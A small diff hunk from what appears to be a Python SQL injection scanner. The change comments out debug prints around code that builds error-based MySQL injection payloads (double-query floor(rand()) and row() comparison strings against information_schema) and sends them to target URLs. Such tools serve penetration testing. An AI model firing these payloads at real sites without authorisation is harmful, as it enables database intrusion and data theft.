@@ -186,10 +186,10 @@ class classSQL(object):
         for d in confirm_data:
             confirm_value1 = d[0] + ' and(select 1 from(select count(*),concat((select concat(' + anchor + ') from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and ' + d[1]
             confirm_value2 = d[0] + '(select 1 and row(1,1)>(select count(*),concat(concat(' + anchor + '),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))' + d[1]
-            print confirm_value1
-            print confirm_value2
+            # print confirm_value1
+            # print confirm_value2
             self.get_value(payload=[confirm_value1, confirm_value2])
-            print "=========== confirm sql error injection============"
+            # print "=========== confirm sql error injection============"
             # self.start_test()
             for url in self.to_check_list:
                 try:
